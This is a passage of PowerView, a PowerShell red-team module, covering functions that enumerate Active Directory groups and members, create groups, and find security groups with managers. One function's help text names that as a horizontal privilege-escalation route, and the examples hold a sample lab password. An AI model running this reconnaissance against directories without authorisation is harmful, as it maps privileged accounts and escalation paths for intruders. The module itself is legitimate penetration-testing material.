                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $Filter += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $GroupScopeValue = $PSBoundParameters['GroupScope']
                    $Filter = Switch ($GroupScopeValue) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
                    $Filter = Switch ($GroupPropertyValue) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {
<#
.SYNOPSIS

Creates a new domain group (assuming appropriate permissions) and returns the group object.

TODO: implement all properties that New-ADGroup implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.GroupPrincipal with the specified
group properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the group to create.
Maximum of 256 characters. Mandatory.

.PARAMETER Name

Specifies the name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the group to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.'

Creates the 'TestGroup' group with the specified description.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.' -Credential $Cred

Creates the 'TestGroup' group with the specified description using the specified alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.GroupPrincipal
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        # set all the appropriate group parameters
        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $Description
        }

        Write-Verbose "[New-DomainGroup] Attempting to create group '$SamAccountName'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[New-DomainGroup] Group '$SamAccountName' successfully created"
            $Group
        }
        catch {
            Write-Warning "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
        }
    }
}


function Get-DomainManagedSecurityGroup {
<#
.SYNOPSIS

Returns all security groups in the current (or target) domain that have a manager set.

Author: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  

.DESCRIPTION

Authority to manipulate the group membership of AD security groups and distribution groups
can be delegated to non-administrators by setting the 'managedBy' attribute. This is typically
used to delegate management authority to distribution groups, but Windows supports security groups
being managed in the same way.

This function searches for AD groups which have a group manager set, and determines whether that
user can manipulate group membership. This could be a useful method of horizontal privilege
escalation, especially if the manager can manipulate the membership of a privileged group.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainManagedSecurityGroup | Export-PowerViewCSV -NoTypeInformation group-managers.csv

Store a list of all security groups with managers in group-managers.csv

.OUTPUTS

PowerView.ManagedSecurityGroup

A custom PSObject describing the managed security group.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        # go through the list of security groups on the domain and identify those who have a manager
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $SearcherArguments['Identity'] = $_.managedBy
            $Null = $SearcherArguments.Remove('LDAPFilter')

            # $SearcherArguments
            # retrieve the object that the managedBy DN refers to
            $GroupManager = Get-DomainObject @SearcherArguments
            # Write-Host "GroupManager: $GroupManager"
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName

            # determine whether the manager is a user or a group
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $ACLArguments = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

            # # TODO: correct!
            # # find the ACLs that relate to the ability to write to the group
            # $xacl = Get-DomainObjectAcl @ACLArguments -Verbose
            # # $ACLArguments
            # # double-check that the manager
            # if ($xacl.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -and $xacl.AceType -eq 'AccessAllowed' -and ($xacl.ObjectSid -eq $GroupManager.objectsid)) {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $True
            # }
            # else {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $False
            # }

            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {
<#
.SYNOPSIS

Return the members of a specific domain group.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for the specified
group matching the criteria. Each result is then rebound and the full user
or group object is returned.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Recurse

Switch. If the group member is a group, recursively try to query its members as well.

.PARAMETER RecurseUsingMatchingRule

Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.
Much faster than manual recursion, but doesn't reveal cross-domain groups,
and only returns user accounts (no nested group objects themselves).

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMember "Desktop Admins"

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

'Desktop Admins' | Get-DomainGroupMember -Recurse

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Testing Group
GroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroupMember -Domain testlab.local -Identity 'Desktop Admins' -RecurseUingMatchingRule

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember

.EXAMPLE

'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local', 'Domain Admins' | Get-DomainGroupMember

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroupMember -Credential $Cred -Identity 'Domain Admins'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'dev\domain admins' | Get-DomainGroupMember -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Extracted domain 'dev.testlab.local' from 'dev\domain admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=domain admins)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))

GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : user1
MemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108

VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))
GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-500

.OUTPUTS

PowerView.GroupMember

Custom PSObject with translated group member property fields.

.LINK

http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $SearcherArguments['Identity'] = $Identity
                $SearcherArguments['Raw'] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove('Raw')
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item('member')

                    if ($Members.count -eq 0) {
                        # ranged searching, thanks @meatballs__ !
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if ($GroupFoundDN) {
